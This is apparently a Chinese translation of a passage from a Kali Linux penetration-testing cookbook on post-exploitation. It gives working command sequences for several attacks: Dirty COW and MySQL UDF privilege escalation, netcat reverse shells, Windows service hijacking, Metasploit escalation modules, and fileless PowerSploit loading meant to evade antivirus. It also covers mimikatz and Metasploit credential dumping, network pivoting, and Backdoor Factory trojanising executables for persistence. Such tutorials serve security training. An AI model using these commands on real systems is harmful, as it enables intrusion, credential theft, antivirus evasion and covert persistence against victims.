1.  我们可以使用诸如**Linux Exploit Suggester**之类的脚本。这是一个用 Perl 构建的脚本，我们可以指定内核版本，它将显示可能公开可用的漏洞利用，我们可以使用它来获得 root 权限。该脚本可以从[`github.com/PenturaLabs/Linux_Exploit_Suggester`](https://github.com/PenturaLabs/Linux_Exploit_Suggester)下载：

```
 git clone https://github.com/PenturaLabs/Linux_Exploit_Suggester.git
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6688998f-d1ca-4c5b-940d-20901bbaeb2f.png)

1.  现在我们使用`cd`命令进入目录：

```
 cd Linux_Exploit_Suggester/
```

1.  它很容易使用，我们可以通过命令找到内核版本：

```
 uname –a
```

1.  我们还可以使用我们在上一个教程中看到的枚举脚本。一旦我们有了版本，我们可以使用以下命令将其与我们的脚本一起使用：

```
 perl Linux_Exploit_Suggester.pl -k 2.6.18
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/aa614691-c993-4446-9340-45bbc2d8d136.png)

让我们尝试使用其中一个漏洞利用；我们将使用最新的一个，即**dirty cow**。

这是 RedHat 解释的 dirty cow 的定义：在 Linux 内核的内存子系统处理**写时复制**（**COW**）破坏私有只读内存映射的方式中发现了竞争条件。非特权本地用户可以利用这个缺陷来获得对否则只读内存映射的写访问权限，从而增加他们在系统上的权限。

可以在 exploit DB 上看到这个漏洞代码[`www.exploit-db.com/exploits/40839/`](https://www.exploit-db.com/exploits/40839/)。这个特定的漏洞利用程序向`etc/passwd`添加了一个具有根权限的新用户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d6238552-2c9f-40e2-8261-4c1a6da7fb62.png)

我们下载漏洞并将其保存在服务器的`/tmp`目录中。它是用 C 语言编写的，所以我们可以使用服务器上的`gcc`编译它，使用以下命令：

```
gcc –pthread dirty.c –o <outputname> -lcrypt
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/eeea674d-3c1d-42ff-9815-f2baa6145502.png)

我们使用以下命令`chmod`（更改文件权限）文件：

```
chmod +x dirty
```

然后我们使用`./dirty`运行它。我们将失去我们的反向连接访问权限，但如果一切顺利，我们现在可以使用用户名`firefart`和密码`firefart`作为根用户`ssh`到机器上。

我们使用以下命令尝试`ssh`：

```
ssh –l firefart <IP Address>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f5371878-fc1d-4a48-b4d2-925e4c4a0021.png)

现在，dirty cow 有点不稳定，但我们可以使用这个解决方法来使其稳定：

```
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

让我们执行命令 ID；我们将看到我们现在是系统的根用户！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8eb13a53-9176-429a-9cf2-217c4ec14cb3.png)

现在让我们看另一种实现根权限的方法。在这种情况下，我们将假设我们在系统上有一个 shell，并且我们运行的枚举脚本向我们显示 MySQL 进程正在作为系统根用户运行。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/21e973d7-e52a-4aef-8722-b3765333bfc7.png)

MySQL 有一个名为**用户定义函数**（**UDF**）的功能；让我们看一种通过 UDF 注入获得根权限的方法。现在我们有两个选择：要么在受损系统上下载代码并进行编译，要么从[`github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so`](https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so)下载预编译代码。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9d3ff962-4dc2-4858-b2a6-1caa42393401.png)

一旦它被下载，我们就登录到数据库。通常，人们会将默认的 root 密码留空；或者，我们可以从运行在服务器上的 web 应用程序的配置文件中获取一个。

现在，我们创建一个表，并使用这些命令将我们的文件插入到表中：

```
create table <table name> (hello blob);
insert into <table name> values (load_file('/path/to/mysql.so'));
select * from <table name> into dumpfile '/usr/lib/mysql/plugin/mysqludf.so';
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1b701a67-b90d-4d76-bc93-cb5affcf3b9a.png)

对于 Windows 系统，命令是一样的；只是到 MySQL 的路径会有所不同。

接下来，我们创建一个`sys_eval`函数，它将允许我们以根用户身份运行系统命令。对于 Windows，我们运行这个命令：

```
CREATE FUNCTION sys_eval RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
```

对于 Linux，我们运行这个命令：

```
CREATE FUNCTION sys_eval RETURNS integer SONAME 'mysqludf.so;
```

现在我们可以使用`sys_eval`来做任何我们想做的事情；例如，要进行反向连接，我们可以使用这个：

```
select sys_eval('nc –v <our IP our Port> -e /bin/bash');
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/61944af5-d653-46a7-9f81-e8248a267d63.png)

这将给我们一个作为系统根用户的反向 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f4775e23-2507-4246-846b-476e26bb1e4b.png)

还有其他方法，比如将我们当前的用户添加到 sudoers 文件中。这完全取决于我们的想象力。

# 节点跳跃 - 枢纽

一旦我们在网络上的一个系统中，我们现在需要寻找网络上的其他机器。信息收集与我们在前几章中学到的内容是一样的。我们可以开始安装和使用 nmap 来查找其他主机以及正在运行的应用程序或服务。在这个示例中，您将学习一些获取网络中端口访问权限的技巧。

# 如何做...

假设我们已经可以访问一台机器的 shell。我们运行`ipconfig`并发现该机器内部连接到其他两个网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fb14066b-f091-45eb-9d44-af27a6ddd740.png)

现在我们扫描网络并发现一些机器有一些端口是开放的。您学习了一种很酷的方法，可以将网络枢纽化，以便我们可以访问我们机器上其他网络后面运行的应用程序。

我们将使用以下命令进行`ssh`端口转发：

```
ssh –L <our port> <remote ip> <remote port> username@IP
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2617ef3b-2b5b-449a-85a1-41035e7fae03.png)

完成后，我们打开浏览器并转到我们使用的端口号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c6cf79ba-cab5-4f8b-824f-69386eb625b0.png)

我们将访问远程主机上运行的应用程序。

# 还有更多…

还有其他端口转发的方法；例如，使用 proxychains 将帮助您动态转发运行在不同网络子网内的服务器上的端口。一些技术可以在[`highon.coffee/blog/ssh-meterpreter-pivoting-techniques/`](https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/)找到。

# Windows 特权升级

在这个教程中，您将学习在 Windows Server 上获取管理员帐户的几种方法。有多种方法可以在 Windows 系统上获得管理员权限。让我们看看可以完成这个任务的几种方法。

# 如何做…

一旦我们在系统上有了 meterpreter，Metasploit 有一个内置模块，可以尝试三种不同的方法来获得管理员访问权限。首先，我们将看到 Metasploit 的臭名昭著的`getsystem`。要查看帮助，我们输入：

```
getsystem –h
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e92de5f2-c7e9-4472-8afb-11e88200294f.png)

为了尝试获取管理员权限，我们输入以下命令：

```
getsystem
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2e094e87-7be3-4f53-a2d8-8b35b8723e0f.png)

我们可以看到我们现在是`NT AUTHORITY\SYSTEM`。有时，这种技术可能不起作用，所以我们尝试另一种方法来在机器上获取系统。我们将看一些重新配置 Windows 服务的方法。

我们将使用**sc**（也称为**服务配置**）来配置 Windows 服务。

让我们看看`upnphost`服务：

```
sc qc upnphost
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fa564bc4-6c7b-405c-9bd2-8aa28218926f.png)

首先，我们将我们的`netcat`二进制文件上传到系统上。一旦完成，我们可以使用我们的二进制文件更改正在运行的服务的二进制路径：

```
sc config upnphost binPath= "<path to netcat>\nc.exe -nv <our IP> <our port> -e C:\WINDOWS\System32\cmd.exe"
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b59a25ff-43c7-4173-a313-82648ff44bad.png)

```
sc config upnphost obj= ".\LocalSystem" password= ""
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9ddf4f36-b113-4963-8ed5-102aed8ec42c.png)

我们确认更改是否已经生效：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3a822e9e-5c54-4991-9127-ac454fa66dcd.png)

现在我们需要重新启动服务，一旦完成，我们应该有一个带有管理员权限的后向连接：

```
net start upnphost
```

我们可以使用`net user add`命令来添加一个新的管理员用户到系统中，而不是使用`netcat`等其他方法。

现在让我们尝试另一种方法：Metasploit 有许多不同的用于 Windows 利用的本地漏洞。要查看它们，我们输入`msfconsole`使用`exploit/windows/local <tab>`。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/dc312fcc-7799-46e1-a741-911fb28187b1.png)

我们将使用`kitrap0d`进行利用。使用`exploit/windows/local/ms10_015_kitrap0d`。我们设置我们的 meterpreter 会话和有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8e3e7c94-a9ec-41e6-8a1f-96e33ded9024.png)

然后我们运行利用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d28ad678-55b4-4171-9343-b2217ac25924.png)

我们有管理员权限。让我们再使用一个利用程序：臭名昭著的`bypassuac`：

```
use exploit/windows/local/bypassuac
```

我们现在设置我们在系统上拥有的当前 meterpreter 会话：

```
 set session 1
```

我们运行并看到第二个具有管理员权限的 meterpreter 已经为我们打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ac14da81-870b-4d29-8768-f508439e0996.png)

# 使用 PowerSploit

随着 PowerShell 的推出，也出现了新的利用 Windows 机器的方法。正如维基百科所描述的，PowerShell（包括 Windows PowerShell 和 PowerShell Core）是微软的任务自动化和配置管理框架，由基于.NET Framework 的命令行 shell 和相关脚本语言组成。

在这个教程中，我们将使用 PowerSploit，这是一个基于 PowerShell 的后渗透框架，用于在系统上获得 meterpreter 访问权限。

# 如何做…

以下是使用 PowerSploit 的步骤：

1.  现在假设我们有一个基于 Windows 的环境，在这个环境中我们已经成功获得了 shell 访问权限。我们在系统上没有管理员权限。

1.  让我们看一种很酷的方法，使用 PowerSploit 在不实际下载文件到系统上的情况下获取 meterpreter。它在 Kali 菜单中内置。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f6b724c1-e4f8-4097-916e-51b3db0773bd.png)

1.  这里的技巧是下载一个 PowerShell 脚本并将其加载到内存中，因为它从未保存在硬盘上，所以杀毒软件不会检测到它。

1.  我们首先检查 PowerShell 是否已安装，运行`powershell`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b53aad5b-05ae-465e-a69a-5f0ce4a0fed5.png)

1.  我们将使用这个命令。使用单引号很重要；否则，我们可能会得到一个缺少括号的错误：

```
 powershell IEX (New-Object Net.WebClient).DownloadString
      ('https://raw.githubusercontent.com/PowerShellMafia/
      PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4d7c0558-ad8f-413e-b3ff-cfcea063b805.png)

1.  我们不应该看到任何错误。现在我们的脚本已经准备好了，我们调用模块并使用以下命令查看帮助：

```
 Get-Help Invoke-Shellcode
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2757b763-17ef-4760-abee-66ab407f67ca.png)

1.  现在我们运行该模块：

```
 powershell Invoke-Shellcode -Payload
      windows/meterpreter/reverse_https -Lhost 192.168.110.33
      -Lport 4444 –Force
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/116bd076-38a2-4350-9eca-30768454a207.png)

1.  在运行上述脚本之前，我们启动我们的处理程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9913d29d-37d8-420b-841c-f5dfca462aca.png)

1.  我们现在应该有一个 meterpreter。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7fdfd3d3-ef51-4d81-ae8c-b6f921f9cdc7.png)

1.  现在我们有了 meterpreter，我们可以使用之前提到的任何方法来获取系统权限。

# 还有更多...

PowerSploit 有很多可以用于进一步利用的 PowerShell 模块，比如获取权限、绕过杀毒软件等等。

我们可以在这里阅读更多信息：

+   [`github.com/PowerShellMafia/PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)

+   [`null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/`](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/)

# 使用 mimikatz 提取纯文本密码

现在我们有了 meterpreter，我们可以使用它从内存中转储密码。Mimikatz 是一个很好的工具。它尝试从内存中转储密码。

正如 mimikatz 的创造者所定义的：

“它是用 C 语言制作的，并被认为是一些与 Windows 安全性的实验”现在已经广为人知，可以从内存中提取纯文本密码、哈希值和 PIN 码以及 kerberos 票证。Mimikatz 还可以执行传递哈希、传递票证或构建 Golden 票证。

# 如何做…

以下是使用 mimikatz 的步骤：

1.  一旦我们有了 meterpreter 和系统权限，我们使用这个命令加载 mimikatz：

```
 load mimikatz
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7ba7c432-17a8-4279-9f90-4cef0716354e.png)

1.  要查看所有选项，我们输入这个命令：

```
 help mimikatz
```

1.  现在为了从内存中检索密码，我们使用 Metasploit 的内置命令：

```
 msv
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/87681445-ca9e-4233-9c80-ba146c5f044b.png)

1.  我们可以看到 NTLM 哈希值显示在屏幕上。要查看 Kerberos 凭据，我们输入这个：

```
 kerberos
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d70e780e-2227-4730-957c-cfaaf24b1324.png)

如果有任何凭据，它们将在这里显示。

# 从机器中转储其他保存的密码

您已经学会了如何从内存中转储和保存纯文本密码。然而，有时并非所有密码都被转储。不用担心；Metasploit 有其他后期利用模块，我们可以使用这些模块来收集在我们入侵的服务器上运行的不同应用程序和服务的保存密码。

# 如何做…

首先，让我们检查一下机器上正在运行的应用程序。我们使用这个命令：

```
use post/windows/gather/enum_applications
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ff6942b5-241e-46c5-917e-fe396078b127.png)

我们看到了选项；现在我们只需要我们的会话，使用以下命令：

```
set session 1
```

运行它，我们将看到系统上安装的应用程序列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/234124c9-8966-4486-8fa9-a031062c78c6.png)

既然我们知道了正在运行的应用程序，让我们试着收集更多信息。

我们将使用`post/windows/gather/enum_chrome`。

它将收集所有的浏览历史、保存的密码、书签等。再次，我们设置我们的会话并运行这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2f4b85ab-ab5b-42e7-8600-578df6489795.png)

我们将看到所有收集到的数据都已保存在一个 txt 文件中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7c057e89-cc1e-42ac-a26a-f9b8b7fad9e4.png)

现在我们将尝试收集安装在机器上的 FileZilla 服务器（可用于传输文件的 FTP 服务器）的存储配置和凭据。我们将使用该模块：

```
use post/windows.gather/credentials/filezilla_server
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/aff3af56-4a31-4124-9421-b5564b25a1a5.png)

我们设置会话并运行它，然后我们应该看到保存的凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ef4538d4-e0d0-4caf-bd74-dee2e44610f5.png)

让我们使用另一个后渗透模块来转储数据库密码。我们将使用这个：

```
use exploit/windows/gather/credentials/mssql_local_hashdump
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a8b33af3-02bd-47b5-a2d7-b2afbb83d4f5.png)

我们设置会话并使用`run -j`运行此命令。我们将在屏幕上看到凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/373ecab6-9bf2-41ae-ab91-97b88b5d5d5e.png)

# 进入网络枢纽

一旦我们完全控制了系统中的一台计算机，我们的下一步应该是进入网络并尝试利用和访问尽可能多的机器。在这个示例中，您将学习使用 Metasploit 轻松实现这一点的方法。

# 如何做...

Metasploit 有一个内置的 meterpreter 脚本，允许我们添加路由并使我们能够使用当前机器攻击网络中的其他机器。这个概念非常简单；我们所要做的就是执行这个命令：

```
run autoroute –s <IP subnet>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bc51fae7-726a-4ce6-8e27-ef366d72e28b.png)

完成后，我们可以简单地利用与我们在之前示例中介绍的相同方法来攻击机器。

# 持久性的后门

成功利用的一个重要部分是能够保持对受损机器的访问。在这个示例中，您将了解一个称为后门工厂的神奇工具。后门工厂的主要目标是使用我们的 shell 代码修补 Windows/Linux 二进制文件，以便可执行文件正常运行，并在每次执行时执行我们的 shell 代码。

# 如何做...

Backdoor Factory 已经安装在 Kali 中。可以使用`backdoor-factory`来运行。要查看此工具的所有功能，我们将使用帮助命令：

```
backdoor-factory –help
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f2bb2db5-4ffb-4402-a66b-ee117982ed5a.png)

使用这个工具并不太难；但是，建议在部署到目标系统之前对二进制文件进行测试。

要查看要对其进行后门处理的特定二进制文件的可用选项，我们使用以下命令：

```
backdoor-factory –f <path to binary> -s show
```

然后我们将使用`iat_reverse_tcp_stager_threaded`：

```
backdoor-factory –f <path to binary> -s iat_reverse_tcp_stager_threaded –H <our IP> -P <Port>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a65a4970-36ad-4ef9-b3b5-61f1cfb336c9.png)

接下来，我们选择要用于注入有效载荷的洞穴：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a944b432-52de-461f-95fb-32b4f38b2a4c.png)

我们的二进制文件已经创建并准备部署。

现在我们需要做的就是运行一个处理程序，它将接受来自我们有效载荷的反向连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d3b2866d-9401-481b-b5ab-72826746f7f8.png)

现在当在受害者机器上执行`.exe`时，我们将连接到我们的 meterpreter：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3a28c4ee-e63c-4c2b-bd73-875bad8e59bf.png)
